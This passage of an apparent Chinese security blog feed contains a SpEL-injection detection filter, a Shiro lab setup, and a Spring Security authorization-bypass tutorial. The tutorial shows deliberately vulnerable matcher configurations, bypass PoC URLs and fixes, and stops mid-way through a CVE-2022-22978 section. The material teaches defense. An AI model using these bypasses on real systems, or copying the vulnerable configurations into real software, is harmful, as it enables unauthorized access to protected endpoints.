language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpELInjectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Regex pattern to detect potential SpEL injections</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SPEL_INJECTION_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"#\\&#123;[^&#125;]+\\&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Initialization code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span>            <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">HttpServletRequest</span> httpRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>            <span class="token comment">// Check query parameters</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in parameter: "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// Check headers</span>            <span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerNames <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeaderNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>headerNames<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> header <span class="token operator">=</span> headerNames<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> headerValue <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>headerValue<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in header: "</span> <span class="token operator">+</span> header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Continue with the filter chain</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Cleanup code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Method to check if a value contains potential SpEL injection patterns</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">SPEL_INJECTION_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.example.filters.SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是springboot，过滤器类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>filters<span class="token punctuation">.</span></span><span class="token class-name">SpELInjectionFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterRegistrationBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySpringBootApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">MySpringBootApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> <span class="token function">spELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> registrationBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">addUrlPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> registrationBean<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&quot;&gt;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&quot;&gt;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&quot;&gt;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Attack</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/</id>
    <published>2024-07-15T13:56:45.000Z</published>
    <updated>2024-07-15T14:11:11.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：<a href="https://natro92.fun/posts/4b382a45/">https://natro92.fun/posts/4b382a45/</a></p><span id="more"></span><hr><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>环境：jdk1.8 + tomcat 8.5.98 + shiro 1.2.4</p><p>这里直接用p神的项目了：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>下载后直接用IDEA打开，配置一下tomcat环境</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715212213428.png" alt="image-20240715212213428"></p><p>运行配置</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715213701618.png" alt="image-20240715213701618"></p><blockquote><p>Tips：如果tomcat控制台出现乱码，请在设置-控制台中更改编码为UTF-8</p></blockquote><blockquote><p>Tips：只有下载了源码才能在全局搜索中搜到对应调用的方法：请在 设置-Maven-正在导入 内修改</p></blockquote><p>然后访问即可</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715214344403.png" alt="image-20240715214344403"></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://natro92.fun/posts/4b382a45/&quot;&gt;https://natro92.fun/posts/4b382a45/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>SpringSecurity权限绕过</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/SpringSecurity%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/SpringSecurity%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</id>
    <published>2024-07-15T10:19:13.000Z</published>
    <updated>2024-07-19T02:49:43.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>趁热打铁v2，虽然实际上是纯记录用的</p><p>参考：<a href="https://xz.aliyun.com/t/13235">https://xz.aliyun.com/t/13235</a></p><span id="more"></span><hr><h1 id="antMatchers-配置不当权限绕过"><a href="#antMatchers-配置不当权限绕过" class="headerlink" title="antMatchers 配置不当权限绕过"></a>antMatchers 配置不当权限绕过</h1><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> antMatchersConfig <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">InMemoryUserDetailsManager</span> <span class="token function">userDetailsService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserDetails</span> user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token function">withDefaultPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">username</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryUserDetailsManager</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里使用了<code>antMatchers(&quot;/test&quot;).access(&quot;hasRole(&#39;ADMIN&#39;)&quot;)</code>，只有ADMIN才可以访问<code>test</code>,但是没有去按照正常的写法:  <code>/test/**</code> ，导致可以通过<code>/test/</code>，来绕过对<code>/test</code> 的校验</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">mvcMatchers</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/test/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="regexMatchers-配置不当权限绕过"><a href="#regexMatchers-配置不当权限绕过" class="headerlink" title="regexMatchers 配置不当权限绕过"></a>regexMatchers 配置不当权限绕过</h1><blockquote><p>使用正则表达式进行匹配</p></blockquote><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>      <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          http              <span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"anonymous"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/admin</code>正则没写完整</p><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin?</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h2><p>将正则写完整</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin.*?"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="useSuffixPatternMatch-低版本权限绕过"><a href="#useSuffixPatternMatch-低版本权限绕过" class="headerlink" title="useSuffixPatternMatch 低版本权限绕过"></a>useSuffixPatternMatch 低版本权限绕过</h1><p>Spring-webmvc版本在&lt;&#x3D;4.3.25的情况下<code>suffixPatternMatch</code>默认为<code>True</code></p><p>该方法为是否启用后辍匹配,如果启用,则映射到<code>/users</code>的方法也可以匹配到<code>/users.*</code></p><p>也就是说<code>/users</code> 和<code>/users.*</code>是相等的</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><p>低版本（1.x）的springboot上能绕过</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin.123456789</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h2><p>版本更新</p><hr><h1 id="CVE-2022-22978-（regexMatchers）"><a href="#CVE-2022-22978-（regexMatchers）" class="headerlink" title="CVE-2022-22978 （regexMatchers）"></a>CVE-2022-22978 （regexMatchers）</h1><p>影响版本：</p><p>Spring Security 5.6.x &lt; 5.6.4<br>Spring Security 5.5.x &lt; 5.5.7<br>Spring Security 5.4.x &lt; 5.4.11</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin/.*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token 